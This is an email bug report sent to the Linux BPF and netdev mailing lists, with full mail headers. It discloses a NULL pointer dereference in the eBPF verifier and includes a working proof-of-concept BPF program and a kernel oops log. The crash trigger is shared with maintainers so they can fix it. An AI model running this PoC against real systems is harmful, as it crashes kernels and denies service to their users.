Return-Path: <netdev+bounces-278905-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id OFrjNKFG4GkPeQAAu9opvQ
	(envelope-from <netdev+bounces-278905-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 04:17:05 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id A8944409A90
	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 04:17:04 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 14A38308D6CD
	for <lists+netdev@lfdr.de>; Thu, 16 Apr 2026 02:17:03 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id DCE4E223708;
	Thu, 16 Apr 2026 02:17:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="CNjV2Sdn"
X-Original-To: netdev@vger.kernel.org
Received: from mail-oa1-f43.google.com (mail-oa1-f43.google.com [209.85.160.43])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7E1D319CD03
	for <netdev@vger.kernel.org>; Thu, 16 Apr 2026 02:17:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.160.43
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776305821; cv=pass; b=UjMIzmAYAR2sMRMtBARMAPRXhe8tYpaENHmGProUf+1WzgCmeaVUo5p3IstyN9WSnNKxxpQT/tRKpxyfsmbA6wE6s/DJot6n8rU4DujSWd/DbGi2pM02VQGIuBNrJFiVwejdqtYRem/GaJTsz08TIWUTjQNn5XSEAAEu4M18BJM=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776305821; c=relaxed/simple;
	bh=wQiqqhufJb3tgxCD7PXkpOY37pzGWg0bq19XBLHfrVQ=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=FOwVNzmULJg24nrSobYf05ojwGPDz1m1535vKOZUoFCAFvk/6ehJlVM7QCBCjjOoEXkgSvTM3Jj4yO3DBcIcKoBDeHOoLLILOPaXXqFnb+san8xyZk8aevvczk2zek6ppITGzvCDLNOhwjvHQXMNVhslcV90CQz2GHxzDx4LGUM=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=CNjV2Sdn; arc=pass smtp.client-ip=209.85.160.43
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-oa1-f43.google.com with SMTP id 586e51a60fabf-40ea36b56b7so5603111fac.3
        for <netdev@vger.kernel.org>; Wed, 15 Apr 2026 19:17:00 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1776305819; cv=none;
        d=google.com; s=arc-20240605;
        b=OVb3hnrczOtjXz9rkTfTdiMkCItXeHRdGP0LiOaDThGNMlLH5nzB25LFbDU71C2T8R
         zzaZ7WHNoOVihuloVHR+gXsNtRKlP2yNPR13huLV4ns0RWAqYG5BDgB0QiSJ4IExnLfB
         A1s91az62V/Pv63ppbw5SrDabKCVt6XBvtKu+Wgi0ssGsEM+HoPl6yNJ24tIgDGXMVJo
         KUN+LiF4gEY2aHxdMvXVFpyFiVdR/6jE7GkrKVS65B5RYQqztv/mQWTv1nmRHb3ZrX+G
         kbF4uFilNKEVsbDDgmNNczE6yn16N01oDWFC2L0ukwvLIT63T19MwznWOc+VWh9hXlZ+
         KqaA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:dkim-signature;
        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
        fh=15yzLquNou/xpxXy1Qr5JJdBq44U5DhN6eBpnoqbD5I=;
        b=Vn7oXyjhmwANcx21Cwu6fr55pp5qwpI447RcWCNHlbR8PK8G3BiWAzW7lW8cunfdos
         r0asnK9j4MJeuVmSeMW4/jKcmNeXzlVWQoB1kOWldB0B82/PjJuvXhb5f8ptM1bMKAAQ
         yl4OrqlUR3ek6DdGQ6V1F6ZBkijG6VxNnX5Tps8K/taCdMeiyd96QvXePbMp17qKzTxS
         RDY1+SDsPR/QNRb9QDnGDU9f7mOL1kSBdMkJNjwfYsASu7mT48KhzxCyXQaqe2W8fPri
         u4BcMnu0G0Uw6r7G4l1sRguJKRqD6R0Auqb3xHTqUuNyYJZQInDjzM/3iG8ntIALEzoM
         FH3w==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1776305819; x=1776910619; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
        b=CNjV2SdnWRicGal81q+BFRSAh+lYHteGGGT48BvzsJlt4srFyI5BhWr98TCeWYs/0r
         bBOgKbJtbiUjcY/g0j7c71IFFEhKcKV7ag2QsYn+aCHFXzryMu7w73OgBb8Vux6DTLI8
         e4XvCUPN8DLTXqqZgC93nYTRUg0ncScstoRi/C+fT39WrVo0au/3dc4FGQGGV2dutdjd
         nfhqZ33jQmLT33eU+KMc+4fgB6s5VvAnHN+X0tj2AflM/8rmT91ZOMgKAScf0x5xBjO3
         w4X4q4TRz/mVpKG5HRsAQt2Fm1GH1Gvz0MRUzeucMuNiqfFlHQyhd/Zye657yCZAH/oJ
         AWpg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1776305819; x=1776910619;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
        b=Gf+5c1nH5NJHlVOlyCZ2NMjMaKJtNqTAAtV6Nocqmjeam4bxI1+S5kN8PHLlgqHoty
         sFIyifJleLdQLHU2VeG3+ya22SbeJyIxmOEbKxSVczQZ4EzbssLFnWZgkF/Jef4V/2iT
         9+v4eJPrz2Gcf769ihuYo87oF+0UmrnHM1N6FITE0FqW2fHAJRuXx3ZdJveU7488IDHS
         8caTCvpuxCyneFHBOoWkF+hHv3l0lnlZO+iB3UyvexClMsoEyXttafMKnWKVzpisd30z
         fZHSvobDBgIEMVy+5xBEbx3XrmzBwozUPpKSLGgd7vdqWSWVgGzxaEesR3MSTWfP3fFv
         U3Bw==
X-Forwarded-Encrypted: i=1; AFNElJ/34yAXgCdytOZyr9KYasZdJ3VzCqoAncfCZaaCJ8RZh3uIk/mO48pBV+KMdGIgETlpl9bIg7g=@vger.kernel.org
X-Gm-Message-State: AOJu0Yx1Xqa9nVa0sWbfSxH+5HyZNqI2/KiNooT+8TOgg6WtGvXxqzMT
	2ZezcHQDo/KB8yhSkn+FhTJZoOosugJr8SC1I4dyEQeinrFEZwwYXoIXM2VI4QZbo8E1PBhJiA7
	5eTj00OtnK1EXFK56k3bvVql8fPzJGdw=
X-Gm-Gg: AeBDiesxIO4KlcBM6eAB03nymNrSzqDtE8btvq5uoyFvNeKcaV2pQBW8uxL3e3G/VCR
	2HHpl7QF2L87Q8v6DZtGwbDBqdhpkXVLQJFtkEgcFlJc2J8YX6g5gJG1ttFrgeAmb3jQzUUlcWR
	qqCnA7elDXKfyK3hDy9Ggw5QLf+0JnNfuxr50wTUepl8L5ewrXtM4dpZ32CwSZNVOljSRx1DwRw
	P3TisV3NpXXrX0cSo908sVzU8knr0enJCVfwKlziQeNpHAtDaO4fvL72RbsSAtpX8d91n1WHbc3
	jm7glw==
X-Received: by 2002:a05:6870:420f:b0:417:5105:a735 with SMTP id
 586e51a60fabf-423e11118ecmr13498590fac.33.1776305819281; Wed, 15 Apr 2026
 19:16:59 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Hiker Cl <clhiker365@gmail.com>
Date: Thu, 16 Apr 2026 10:16:46 +0800
X-Gm-Features: AQROBzBYX4zd6BdxBIcwUa7EyBGQ0SzGZ4lXbLy4c9ax8OzRHuVydFZsHlg57oI
Message-ID: <CAGM=xGABGeeGVU7hy_mRr_rp377dBzVVAOpkLnuYKb8XyEs7Hg@mail.gmail.com>
Subject: NULL pointer dereference in map_kptr_match_type when storing scalar
 values into kptr slots
To: bpf@vger.kernel.org
Cc: linux-kernel@vger.kernel.org, netdev@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip4:172.234.253.10:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	TAGGED_FROM(0.00)[bounces-278905-lists,netdev=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN_FAIL(0.00)[10.253.234.172.asn.rspamd.com:server fail];
	MIME_TRACE(0.00)[0:+];
	FROM_HAS_DN(0.00)[];
	MISSING_XM_UA(0.00)[];
	RCPT_COUNT_THREE(0.00)[3];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[clhiker365@gmail.com,netdev@vger.kernel.org];
	DKIM_TRACE(0.00)[gmail.com:+];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[netdev];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid]
X-Rspamd-Queue-Id: A8944409A90
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

Hi BPF maintainers,

I'm reporting a bug I encountered in the BPF subsystem on Linux kernel
version 7.0.0-g1f5ffc672165.

### Summary
A NULL pointer dereference vulnerability was discovered in the eBPF
verifier. A local user can trigger this by loading a BPF program that
attempts to store a scalar value (non-pointer) into a map slot
designated as a kptr (kernel pointer). This leads to an immediate
kernel crash (DoS).
### Environment
- Kernel version: 7.0.0-rc6 (Commit: 71b500afd2f7 from bpf-next tree),
7.0.0-g1f5ffc672165 (Commit: 1f5ffc672165 from linux tree)
- Architecture: x86_64
- Config: BPF_SYSCALL=3Dy, DEBUG_INFO_BTF=3Dy

### Steps to Reproduce =EF=BC=88poc.c)
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
/* BTF type tags for kptrs */
#ifndef __kptr_untrusted
#define __kptr_untrusted __attribute__((btf_type_tag("kptr_untrusted")))
#endif
struct map_value {
struct task_struct __kptr_untrusted *ptr;
};
struct {
__uint(type, BPF_MAP_TYPE_LRU_HASH);
__uint(max_entries, 1);
__type(key, int);
__type(value, struct map_value);
} crashing_map SEC(".maps");
SEC("kprobe/htab_map_get_next_key")
int trigger_crash(struct pt_regs *ctx)
{
int key =3D 0;
u64 *val =3D bpf_map_lookup_elem(&crashing_map, &key);
if (val) {
/*
* Trigger: Store a scalar (non-pointer) into a slot
* designated as a kptr. The verifier's map_kptr_match_type
* fails to handle the NULL reg->btf for scalars.
*/
*val =3D 0xdeadbeef;
}
return 0;
}
char LICENSE[] SEC("license") =3D "GPL";

### Kernel Log Extract
[   91.277247][ T7627] Oops: general protection fault, probably for
non-canonical address 0xdffffc0000I
[   91.279715][ T7627] KASAN: null-ptr-deref in range
[0x00000000000000e8-0x00000000000000ef]
[   91.280906][ T7627] CPU: 0 UID: 0 PID: 7627 Comm: bpftool Not
tainted 7.0.0-g1f5ffc672165 #5 PREEMPT(full)
[   91.282421][ T7627] Hardware name: QEMU Standard PC (i440FX + PIIX,
1996), BIOS 1.15.0-1 04/01/2014
[   91.283556][ T7627] RIP: 0010:btf_is_kernel+0x2a/0x50
...

### Actual Results
The kernel crashes during the verification phase. The verifier calls
`map_kptr_match_type`, which subsequently calls
`btf_is_kernel(reg->btf)`. Since the source register is a scalar,
`reg->btf` is NULL, leading to a NULL pointer dereference.

Detailed info including reproducible BPF program and kernel logs have
been filed on Bugzilla:

  https://bugzilla.kernel.org/show_bug.cgi?id=3D221372

Please let me know if you need more information or if I can help test a pat=
ch.

